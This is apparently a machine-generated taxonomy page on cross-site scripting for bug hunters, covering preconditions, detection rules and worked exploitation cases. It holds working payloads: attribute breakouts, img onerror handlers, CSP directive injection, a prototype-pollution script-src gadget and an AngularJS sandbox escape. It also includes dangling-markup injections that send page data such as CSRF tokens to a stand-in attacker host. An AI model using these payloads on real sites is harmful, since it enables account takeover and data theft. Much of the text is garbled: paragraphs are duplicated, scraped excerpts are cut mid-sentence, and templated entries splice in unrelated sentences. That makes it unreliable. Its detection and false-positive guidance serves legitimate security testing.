# Cross-Site Scripting

## Definition

Attacker-controlled data reaches a script execution context in another user's browser without neutralisation.

- **CWE:** CWE-79
- **OWASP:** A03:2021
- **Surface:** client
- **Aliases:** ["xss", "cross site scripting", "stored xss", "reflected xss", "dom xss"]

Canonical home for `xss`. Rendered from `db/wks.db` by `tools/taxonomy/build_taxonomy.py` — edit the rows, not this file.

## Root Cause

Not yet researched.

## Preconditions

**Reflected XSS requires attacker data from the current HTTP request to be embedded unneutralized in that same immediate response.**

Enumerate every request-controlled surface (query string, message body, URL path, and headers such as Referer) and confirm each candidate produces its value in the immediate response body before treating it as XSS. If the probe value never appears in the immediate response there is no reflected sink, and the candidate must be dropped rather than reported.

*Disproof:* The unique probe value is absent from the immediate HTTP response for that surface, or appears only after a separate later request, making it stored rather than reflected.

**Stored XSS requires the payload to persist in a server-side store and later render in another user's response, so proof needs two distinct steps.**

Inject a unique marker into every plausible entry point, then hunt for that marker as an exit point in responses seen by a second, different user or role such as an admin view. The injection write and the later rendering read are separate actions; a marker that only ever reflects back to its own author is not stored XSS and must not be filed as such.

*Disproof:* The payload executes only in the submitting user's own session and never renders for any other user or role.

**An injection-class report stands only when untrusted input is shown reaching an interpreter that acts on it, and for cross-site scripting that interpreter is the browser executing a script, event handler or DOM write rather than text rendered inert.**

An injection-class report stands only when untrusted input is shown reaching an interpreter that acts on it, and for cross-site scripting that interpreter is the browser executing a script, event handler or DOM write rather than text rendered inert.

HackTricks reference: injections html xss etc (https://oreobiscuit.gitbook.io/introduction/bug-bounty-reports-and-articles/injections-html-xss-etc.md)

*Disproof:* If the same input is provably neutralised by encoding or escaping before it reaches any browser-executed script context, event handler or DOM write, the cross-site scripting claim fails.

**Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.**

Service-worker XSS is only reachable when two prerequisites line up: a place to serve attacker JavaScript from the target origin, either a file upload or a JSONP endpoint whose output can be filled with arbitrary JS, plus an XSS that can load and register that script as the worker.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

*Disproof:* Registering and controlling a worker script on the origin with neither arbitrary-JS hosting nor a JSONP endpoint that can be made to emit arbitrary JS refutes these as the required prerequisites.

**A message listener that never checks the origin of incoming messages turns cross-origin postMessage data into a cross-site scripting vector, because any hostile page can then drive the handler.**

A message listener that never checks the origin of incoming messages turns cross-origin postMessage data into a cross-site scripting vector, because any hostile page can then drive the handler.

HackTricks reference: post message xss (https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md)

*Disproof:* A handler that rejects messages whose origin is not the expected one, and never writes the received data into a scriptable sink, is not reachable cross-origin.

**An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable — 'unsafe-eval' in the policy buys the tester nothing here.**

An onerror-style inline event handler payload only runs when script-src actually permits inline execution, so the extension CSP has to be read before the payload is called exploitable — 'unsafe-eval' in the policy buys the tester nothing here.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

*Disproof:* An inline event handler payload firing on a page whose script-src carries only 'unsafe-eval', with no 'unsafe-inline', no matching hash or nonce, and no other executable gadget, refutes this gating.

**The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.**

The worker body is the delivery half of the chain: a fetch-event listener that forwards every intercepted request URL off-origin only runs if that script is served from the vulnerable origin, so both the upload path and the JSONP path are worth probing for a real XSS.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

*Disproof:* A fetch-listener worker registered and intercepting traffic from a script hosted off the vulnerable origin, or a JSONP response whose callback cannot be broken out of, refutes the origin-delivery requirement.

**A message listener that never checks the origin of incoming messages turns cross-origin postMessage data into a cross-site scripting vector, because any hostile page can then drive the handler.**

A message listener that never checks the origin of incoming messages turns cross-origin postMessage data into a cross-site scripting vector, because any hostile page can then drive the handler.

HackTricks reference: post message xss (https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md)

*Disproof:* A handler that rejects messages whose origin is not the expected one, and never writes the received data into a scriptable sink, is not reachable cross-origin.

## Attack Surface

Surface: **client**.

The entry points and enabling conditions for this surface are enumerated under **Preconditions**; the observable signals are under **Detection**.

## Detection

**DOM XSS exists only where an attacker-controllable source reaches an execution-capable sink; reading the source alone is not a finding.**

For each source (location.search, location.hash, document.referrer, postMessage, document.cookie) search the page JavaScript for reads of that source, then follow the value through intermediate variables until it reaches a sink such as innerHTML, document.write or eval. Report only after the taint path is proven to terminate in a sink; unreachable variables are dead ends.

*Disproof:* The source is read but the value always flows into a safe sink such as textContent or setAttribute, or never reaches any execution-capable sink.

**A published cache-to-XSS bypass cannot be replayed on trust: results have to be pinned to a browser build, because bfcache eligibility and HTTP cache keying have shifted and a documented chain may simply not reproduce on the version in hand.**

A published cache-to-XSS bypass cannot be replayed on trust: results have to be pinned to a browser build, because bfcache eligibility and HTTP cache keying have shifted and a documented chain may simply not reproduce on the version in hand.

HackTricks reference: Chrome Cache to XSS (pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md)

*Disproof:* An old published chain reproducing unchanged across builds with different bfcache eligibility and cache-keying behaviour, and failing only for unrelated reasons, refutes the version sensitivity.

**Which cache answers the navigation decides the execution context of the same bytes: a bfcache restore hands back the live DOM and JavaScript heap, while a disk-cache restore replays only the response, so a disk-cache hit is the state to look for when a script stops behaving as the tester expects.**

Which cache answers the navigation decides the execution context of the same bytes: a bfcache restore hands back the live DOM and JavaScript heap, while a disk-cache restore replays only the response, so a disk-cache hit is the state to look for when a script stops behaving as the tester expects.

HackTricks reference: Chrome Cache to XSS (pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md)

*Disproof:* A bfcache restore that comes back without the page's JavaScript heap, or a disk-cache restore that revives the previous DOM and heap, refutes this two-cache distinction.

**The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.**

The XSS sink to hunt for in extension code is the pattern of reading a value out of an input, concatenating it into an HTML string and appending the result to the DOM, because that route is open even where the extension CSP blocks eval-like and inline script execution.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

*Disproof:* A concatenating handler whose value is escaped or inserted as text before the append, so the same input renders as literal characters with no new element or handler, refutes this sink pattern.

**Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.**

Reflection alone is not a cross-site scripting finding when the reflected payload sits in the body of a 302: the browser never renders that body, so the injection only counts once it lands somewhere the browser actually parses.

HackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)

*Disproof:* Script executing from a payload delivered only in the body of a 302 response, in a browser that follows the redirect before parsing, refutes this claim.

**A short unique alphanumeric marker submitted to an entry point and found verbatim in the response is the working precondition signal for reflected XSS.**

Submit a short random alphanumeric string to each parameter, body field and path segment, then search the raw response for it. Keep it alphanumeric and short so it survives validation filters while accidental matches stay unlikely. Once the marker is found, map the exact reflection context (HTML body, attribute, script string, URL) before selecting a payload.

*Disproof:* The marker is absent from the response, appears only encoded in a form that cannot be decoded back into a live context, or is reflected only after a separate later request.

**A convincing observation for this class is: Report the header verbatim alongside the request and response pair.**

Derived from xss.validation.a_csp_with_a_nonce_defeats_the_payload_but_a_nonce_must_be_checked_on_the_landing_page, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.validation.a_csp_with_a_nonce_defeats_the_payload_but_a_nonce_must_be_checked_on_the_landing_page) states the full boundary.

**A convincing observation for this class is: The classic false positive is a reflected parameter that appears un-escaped in a raw HTTP response body but is in fact passed through a template engine that escapes it before insertion.**

Derived from xss.fp_rule.template_interpolation_is_escaped_by_the_framework_not_by_the_response, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.fp_rule.template_interpolation_is_escaped_by_the_framework_not_by_the_response) states the full boundary.

**A convincing observation for this class is: The captured data is whatever followed the injection point in the response: CSRF tokens, email content, financial data.**

Derived from xss.technique.dangling_markup.exfiltrates_without_script_execution, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.technique.dangling_markup.exfiltrates_without_script_execution) states the full boundary.

**An attacker-controlled value reflected inside a quoted HTML attribute can execute script without ever emitting an angle bracket, by terminating the attribute value, adding an onfocus handler plus autofocus, and repairing the trailing markup with a bare x=" so the parser stays in sync.**

Worked case: reflection lands in <div attr="$varUnsafe">. The browser is in the attribute-value (double-quoted) state, so the only character that changes the parsing context is U+0022. The payload " autofocus onfocus=alert(document.domain) x=" closes the quote, adds two attributes, and re-opens a quote so the server's own trailing quote closes it - no '<' or '>' is ever needed. Two independent mechanisms make this fire: autofocus makes the element take focus without user interaction, and onfocus is the handler attribute that receives the code. That pairing is why the payload works with zero interaction against a filter that only strips angle brackets. In practice a hunter should conclude the context from the surrounding markup first, then try the attribute-breakout form before the between-tags form, because a WAF that blocks '<' will look completely clean while this payload still fires. The repair suffix matters too: without x=" the server's remaining markup is parsed as new attributes, which can either abort the tag or produce a different element than the developer intended.

*Disproof:* This claim is wrong if the reflected value is HTML-entity-encoded before it lands in the attribute, because &quot; is decoded as text rather than as a quote delimiter and the attribute value never terminates. It is also wrong for an unquoted attribute whose landing context forbids the characters entirely, or if the page sets a CSP without 'unsafe-inline' in script-src, since an inline event handler is then refused by the browser and the handler never runs. Finally it is wrong if autofocus is stripped from allowed attributes AND no user interaction is possible (for example the element is display:none or inside a hidden tab), because then onfocus never fires.

**When a site reflects attacker input into its own Content-Security-Policy - typically the trailing report-uri directive - a semicolon lets the attacker append directives, and the script-src-elem directive lets an appended script-src overwrite the existing nonce or hash based script-src entirely.**

Worked case: the response header ends with report-uri /csp-report, and a parameter is reflected into that header value without filtering. Injecting a semicolon terminates report-uri and opens a new directive, so the policy now reads ...; script-src 'nonce-<unknown>' ...; script-src-elem 'unsafe-inline' http://evil.example.com. CSP ignores duplicate directives of the same name rather than merging them, but script-src-elem is a different directive from script-src: it controls script elements specifically, and crucially it is allowed to overwrite an existing script-src. The result is that the carefully generated per-response nonce no longer restricts script elements at all, and a plain <script src=//evil.example.com/x.js> runs. The lesson for a hunter reading a policy header is that a nonce or hash in script-src is not the whole story: enumerate every script-src-* directive present, because the presence of script-src-elem in an attacker-writable header is the difference between a real defence and a decorative one. Note the asymmetry - script-src-elem does not cover event handlers, so inline handlers still need unsafe-inline or a matching nonce.

*Disproof:* The claim is wrong if the site does not reflect any input into the policy, since there is then nothing to inject and the nonce stands. It is also wrong if the reflected value is filtered so a semicolon or a comma cannot appear, because then no new directive can be opened. It is wrong for browsers that do not implement script-src-elem, where an appended script-src would simply be dropped as a duplicate and the original policy would still apply. And it is wrong for servers that deliver the policy as a meta tag rather than a header in a context where the attacker controls only part of the value, since the injected text is then inert element content rather than a directive.

**Client-side template injection in an AngularJS page executes when the framework's expression evaluator parses the attacker's text, so an injected expression that overwrites String.prototype.charAt defeats the sandbox's own identifier check and hands $eval straight to the attacker.**

Worked case: user input reaches an AngularJS template expression. The sandbox is supposed to stop access to window, document and __proto__, but it decides what is an identifier by calling isIdent(ch) on a single character. The payload first assigns 'a'.constructor.prototype.charAt=[].join, so charAt() now returns the whole argument instead of one character. isIdent() then compares its single-character range against a multi-character string, and because the first characters of the longer string fall inside the compared range it returns true for every character - the whole expression is treated as one safe identifier and passes the checks. Only then can $eval('x=alert(1)') be injected, because overwriting charAt takes effect only once sandboxed code has already run. Note that no HTML is involved at all: the payload contains no script element, no event handler, and no angle brackets, so a scanner looking for markup finds nothing. A hunter should look for the framework itself evaluating data - $eval, $interpolate, orderBy, or an expression passed to a filter - and remember that orderBy accepts an expression argument, which gives a code path even where $eval has been removed.

*Disproof:* The claim is wrong on AngularJS 1.6 and later, where the sandbox was removed entirely because it was never a real security boundary, so the charAt overwrite is unnecessary but the payload still works - which does not make the claim false, it makes it outdated as a description of necessity. It is genuinely wrong if the application never passes untrusted data into an AngularJS template expression or filter, because then no evaluation happens at all and the payload is inert text. It is also wrong if a CSP is enforced in a mode that blocks inline script and the expression cannot reach a DOM event AngularJS itself defines, since the CSP path then refuses the execution.

**Injecting an unterminated img src attribute captures the rest of the victim's response into an outbound request URL without executing any script, because the HTML tokenizer stays in the double-quoted attribute value state until it finds the next quotation mark anywhere in the document.**

Worked case: the application embeds attacker data in a quoted attribute and does not filter > or ". The payload "><img src=https://evil.example.com/?x= closes the attribute and the tag, then opens an img whose src value is deliberately never closed. The HTML tokenizer, now in the attribute value (double-quoted) state, appends every following input character to the attribute's value and only stops when it reaches a U+0022 QUOTATION MARK - which exists somewhere later in the real page. Everything between the injection point and that quote, including CSRF tokens, account data or message content, becomes part of the URL the browser requests from the attacker's host. No script executes: no alert fires, no marker appears in the DOM, and the page looks untouched to a tester watching for script execution. The detection consequence is important - the evidence is an outbound request in the network log, not a DOM artifact, so a hunter must read the request log and then look for the data in the query string. The same mechanism works through any attribute that triggers a request, such as an anchor href with a dangling value.

*Disproof:* The claim is wrong if the surrounding markup contains no double quotation mark at all after the injection point, because the attribute value then consumes to end of file and the browser issues a request with an empty or truncated value. It is also wrong on Chrome, which blocks img URLs containing raw angle brackets and newlines, since the captured content would have to contain one of those to be interesting. It is wrong if the site filters '>' or the quotation mark in the landing context, since the attacker cannot open the new tag at all. And it is wrong under a CSP with img-src 'self', which blocks the external request entirely, leaving no capture.

**A convincing observation for this class is: This is the one class where the response body proves nothing, because the vulnerable code may never see the request server-side at all.**

Derived from xss.technique.dom.source_to_execution_sink, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.technique.dom.source_to_execution_sink) states the full boundary.

**Assigning to element.innerHTML does not run an injected <script> element on any modern browser, so a DOM XSS payload aimed at that sink must instead use an element whose event fires on parse failure, such as an <img> with an invalid src and an onerror handler.**

Worked case: the page does element.innerHTML = location.search. The naive payload <script>alert(document.domain)</script> is inserted as inert markup - the HTML fragment parser builds the element nodes but the script element's 'already started' flag means it never executes, and svg onload does not fire either. The working payload is <img src=x onerror=alert(document.domain)>: the parser tries to load the deliberately invalid src x, the load fails, and the failure fires onerror, which executes the attacker string. Practical consequence for a hunter: a scanner that fires a script-tag marker at every innerHTML sink will report a false negative-then-false-positive cycle - no marker fires, then a generic detector claims XSS. The correct test is to swap in an element-fires-event-immediately construct and check for the marker, and to read which element the code actually assigns to, since document.write on the same page DOES accept a script element and needs the opposite payload. This is the single most common reason a confirmed DOM sink looks unexploitable in a manual retest.

*Disproof:* The claim is wrong if the target browser is one that still executes script elements inserted via innerHTML, since that pre-existing behaviour was never removed from the HTML fragment parsing algorithm in every engine. It is also wrong if the sink is document.write or document.writeln rather than innerHTML, because those go through the full parser and do run a script element. It is additionally wrong for a sink that later re-reads the .innerHTML property and passes it to document.write or eval, where the script element executes after the second step. And it is wrong where Trusted Types enforcement is on and the assignment throws before any parsing happens.

**A convincing observation for this class is: But a renderer that escapes or strips the dangerous constructs produces inert markup: the tag text is present in the response, and no script runs.**

Derived from xss.fp_rule.markup_renderer_output_is_not_execution_until_a_second_stage_sink, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.fp_rule.markup_renderer_output_is_not_execution_until_a_second_stage_sink) states the full boundary.

**A convincing observation for this class is: Repair matters as much as escaping: a leftover dangling fragment becomes a syntax error that kills the entire script block, so the payload appears correct in the response yet never executes.**

Derived from xss.technique.js_string.break_out_and_repair_syntax, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.technique.js_string.break_out_and_repair_syntax) states the full boundary.

**A postMessage listener that never reads event.origin accepts a message from any site, and because any window in the iframe hierarchy can reach the handler top-down, the receiver must check the origin against an allow-list before acting on event.data.**

Worked case: window.addEventListener('message', handler) where handler does document.body.innerHTML = e.data. The receiving side of postMessage has no implicit trust: MDN's own guidance is that if you do not expect messages from other sites, add no listener at all, and if you do, verify the sender using the origin and possibly source properties. The reach is wider than the obvious case - any window, including http://evil.example.com, can post to any other window within the iframe hierarchy from top to every iframe below the current document, so an attacker who can get a frame onto the page, or who can navigate an existing one, reaches the handler. The receiver-side check is the security boundary; the sender-side targetOrigin argument is only about delivery and is not a substitute, because the target window's origin can change after the send through a redirect. In hunting terms, an addEventListener('message') whose body reaches a DOM sink is a finding even when the message data 'looks like' internal JSON, and verification should be reproducing the handler body with a forged event.origin from a different host.

*Disproof:* The claim is wrong if the receiver does validate e.origin against an allow-list before touching e.data, since then a forged-origin message is rejected and nothing executes - the listener existing is not the finding. It is also wrong if the sink inside the handler is not reachable with attacker-chosen data, for example the handler reads only a fixed key and never assigns a value into innerHTML, eval, or a script src. And it is wrong if the handler validates both origin and the syntax of the received message and re-validates before use, because MDN notes that an unvalidated message body from an otherwise trusted sender can itself be the XSS hole.

**A client-side prototype pollution source plus a config object that falls back to a default option becomes script execution when the library writes that inherited option into a script element's src and appends it to the document.**

Worked case: the page merges URL-derived key:value pairs into an object without sanitising keys, and a library does let transport_url = config.transport_url || defaults.transport_url, then document.createElement('script'); script.src = `${transport_url}/example.js`; document.body.appendChild(script). The attacker supplies ?__proto__[transport_url]=//evil.example.com. Because the recursive merge treats __proto__ as a getter for the prototype, the assignment lands on Object.prototype, so every object in the runtime - including the config object, which has no own transport_url - inherits the attacker's domain. The || then never falls through to the default, and appendChild triggers the request for attacker-controlled JavaScript. This is the shape to pattern-match: a property write that is unexploitable on its own, plus a library fallback that reads a missing option, plus a sink that fetches. The important hunting corollary is that there is no injection point into HTML anywhere in this chain - the finding must be argued as source plus gadget plus sink, and the report should say the script element's src is attacker-controlled rather than claiming injected markup, because no markup is ever parsed as markup.

*Disproof:* The claim is wrong if the config object defines its own transport_url property, because an object's own property takes precedence over anything inherited from the prototype and the gadget cannot fire. It is also wrong if the object is created with a null prototype or if Object.prototype is frozen or sealed, since then nothing is inherited and nothing to pollute. It is wrong if the sink is not reached - for example the library only builds a URL string for display and never assigns it to a fetching property. And it is wrong if a CSP restricts script-src to the origin's own domain, in which case the appended script is blocked and the chain stops at the network request rather than executing.

**A convincing observation for this class is: Why it looks vulnerable: you POST {"name":"<script>alert(1)</script>"} to /api/profile and the string comes back verbatim in the response body - a clean taint-to-reflection path with a classic payload.**

Derived from xss.fp_rule.json_api.content_type_json_is_not_html_execution, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.fp_rule.json_api.content_type_json_is_not_html_execution) states the full boundary.

**A convincing observation for this class is: Why it looks vulnerable: your unique probe string comes back in the response body at the exact location you expected, so 'the input is reflected' is satisfied and the report writes itself.**

Derived from xss.fp_rule.html_encoding.entity_encoded_reflection_cannot_break_context, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.fp_rule.html_encoding.entity_encoded_reflection_cannot_break_context) states the full boundary.

**A convincing observation for this class is: Why it looks vulnerable: you POST a payload to a comment field or a profile name, it comes back in the response to YOUR own request with a 200, and the marker persists when you reload - so persistence plus reflection looks like stored XSS and a CVSS vector is already chosen.**

Derived from xss.fp_rule.stored_xss.entry_point_never_reaches_second_user_view, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.fp_rule.stored_xss.entry_point_never_reaches_second_user_view) states the full boundary.

**With require-trusted-types-for enforced, a DOM sink that receives a plain string does not silently sanitise it - the browser attempts to obtain a TrustedScript from a default policy and, if none is defined or none returns one, the operation throws an exception instead of executing.**

Worked case: the page ships Content-Security-Policy: require-trusted-types-for 'script'. Code does const script = document.createElement('script'); script.appendChild(document.createTextNode(untrustedString)); document.body.appendChild(script). Creating the text node does not trigger any check, because at that point the browser has no reason to treat the string as a script source. The enforcement point is appendChild on the script element, at the moment the element becomes executable: the browser asks whether the string is trusted, and if it is not, tries to obtain a TrustedScript from the default policy. With no default policy defined, the call throws and the injected code never runs - the exploit is stopped by an exception rather than by detection. The same applies to the HTML sinks - innerHTML, outerHTML, document.write and script.src - which now reject plain strings and force every assignment through a vetted policy. For a hunter this is the strongest possible fp-rejection evidence: a payload that provably does not throw and does fire proves enforcement is absent or misconfigured, and a payload that throws DOMException in the console is proof the control is real.

*Disproof:* The claim is wrong if a default policy is defined and its transformation function returns the input unchanged, for example a policy built with DOMPurify replaced by an identity function - the sink then receives a TrustedScript and the exception never fires. It is also wrong for an indirect sink that bypasses the check, such as assigning to innerText on a script element or building a script element from a text node, where in some engine versions the check is not applied at the point of assignment. It is wrong where require-trusted-types-for is not actually in the delivered policy header, including the case where the header is present but a report-only variant is used. And it is wrong on browsers that do not implement Trusted Types at all, where the payload runs unchanged.

**A convincing observation for this class is: SUCCESS = an observable effect in a real browser.**

Derived from xss.test.bypass.parens_free_and_template_literal_probes, which states the boundary for this class. The observation above is what a report must contain to be believed: an artifact the reviewer can re-check, not a claim the hunter asserts. A finding without it is an assertion.

*Disproof:* Not evidence when the observable cannot be produced at all -- blind, server-side-only, or identical-in-every-case behaviour leaves nothing to show. The originating rule (xss.test.bypass.parens_free_and_template_literal_probes) states the full boundary.

## Exploitation

**XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.**

with other flaws, for example, "drive-by hacking." 
 
 
 
 
 
 
 
 
 Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application Data 
 
 
 
 
 
 
 Scope: Confidentiality, Integrity, Availability, Access Control 
 
 
 
 The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "XSS can cause a variety of problems for the end user that range in severity from an annoya".

**Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters.**

ot anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended. 
 Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (" 
 Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Input validation will not always prevent XSS, especially if you are required to support fr".

**Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks.**

nd quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (" 
 Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address. 
 Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a compon

*Disproof:* This is refuted if an authoritative source shows the described behaviour does not occur, does not grant access, or is already prevented by default framework configuration: "Even if you make a mistake in your validation (such as forgetting one out of 100 input fie".

**Public writeup evidence for xss: Blob-URL sandbox escape to XSS.**

HARVESTED FROM bugbountydaily RSS -> https://jorianwoltjer.com/blog/p/stories/finding-xss-on-shazzer
Reason it matters: Blob-URL sandbox escape to XSS.

One obvious solution is getting a separate domain to generate the blobs for you, that has nothing shared with Shazzer, so an XSS on that domain doesn't grant access to Shazzer's cookies.

*Disproof:* Refuted if the fetched page no longer contains this exact span, or if the described behaviour is corrected or withdrawn by the publisher.

**Public writeup evidence for xss: self-XSS to account takeover.**

HARVESTED FROM bugbountydaily RSS -> https://zere.es/posts/self-xss-account-takeover/
Reason it matters: self-XSS to account takeover.

So the decoded DOM payload and the request payload together satisfied every condition: The request bypassed raw tag stripping because the tag was not sent as a normal tag.

*Disproof:* Refuted if the fetched page no longer contains this exact span, or if the described behaviour is corrected or withdrawn by the publisher.

**A reflected or stored cross-site scripting entry point is confirmed when a chosen script payload executes in the page context rather than being escaped into inert text.**

In practice on HTB this shows up as: | `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/27. Cross-Site Scripting (XSS)/Cross-Site Scripting (XSS).md (713 words, classified web).

*Disproof:* Refuted when the payload is returned HTML-encoded with no executable sink, which shows the output is contextually escaped rather than vulnerable.

**Client-side template injection executes when the framework scans rendered content for template expressions and evaluates any it finds.**

The mechanism is that the value is not treated as text but as template source. A framework that scans the page for expressions and executes them will evaluate an attacker-supplied expression during render, launching script without any HTML breakout. Hunt for it by finding which template engine the app uses and locating any user input that reaches its render path — the AngularJS family is the common case. Check whether a framework sandbox is present, but treat it as a speed bump rather than a boundary.

*Disproof:* This is wrong if user input never reaches a template render path, if the framework escapes the value before interpolation, or if the value is inserted as a plain data attribute the engine never evaluates.

**An injected unclosed attribute makes the browser send the rest of the response to an attacker URL, achieving data capture with no script execution.**

Where script execution is blocked by filters or CSP, dangling markup still exfiltrates. Inject markup that opens an attribute and never closes it — for example an img whose src points at the attacker's server without a closing quote. The browser then scans forward for the next quotation mark to terminate the attribute, and everything up to that point is treated as part of the URL and sent in the request. The captured data is whatever followed the injection point in the response: CSRF tokens, email content, financial data. Grade it by what the response actually contains downstream, not by the fact that a payload appeared.

*Disproof:* This is wrong if the application escapes or filters the quote and angle-bracket characters that the breakout requires, or if no sensitive data follows the injection point in the response.

**An innerHTML sink will not execute an injected script element, so execution requires an event-handler element such as img or iframe.**

This is the single most common reason a DOM XSS candidate fails to fire: a script tag assigned through innerHTML is parsed as inert markup and never runs on modern browsers, and svg onload does not fire either. Switch to an element with a load or error handler — element.innerHTML='<img src=x onerror=alert(document.domain)>' — and confirm the handler fires. Reporting an innerHTML finding with a script-element payload, without ever seeing it execute, is the standard way this class gets reported as a false positive.

*Disproof:* This is wrong if the sink is document.write rather than innerHTML, if the browser is one that still runs script elements assigned via innerHTML, or if a separate code path appends the node and executes it.

**document.write, innerHTML, outerHTML, insertAdjacentHTML and jQuery html() are execution-capable sinks, while textContent is not.**

Build the finding from the sink list rather than from intuition: document.write and document.writeln, element.innerHTML, element.outerHTML, element.insertAdjacentHTML, and the jQuery family including html(), append(), prepend(), before(), after(), replaceWith(), wrap() and $.parseHTML(). Grep the bundle for these on any SPA. The pairing that matters for severity is that the sink decides the payload, not just the finding — a document.write sink takes a script element directly, while an innerHTML sink does not accept script elements on modern browsers and needs an img or iframe with an event handler instead.

*Disproof:* This is wrong if the value reaching the sink is sanitised by a vetted library configured for that sink, or is only ever assigned as a property value that the browser does not parse as markup.

**DOM-based XSS exists only where an attacker-controllable source reaches a sink that supports dynamic code execution.**

A DOM XSS finding needs both halves proven: a source the attacker controls, and a sink that executes. The source is usually the URL, read through window.location, with the payload carried in the query string, fragment, or path. Trace the value from the read to the write rather than trusting a source's mere presence — a page reading location.hash into a console.log is not a finding, and the same read into innerHTML is. This is the one class where the response body proves nothing, because the vulnerable code may never see the request server-side at all.

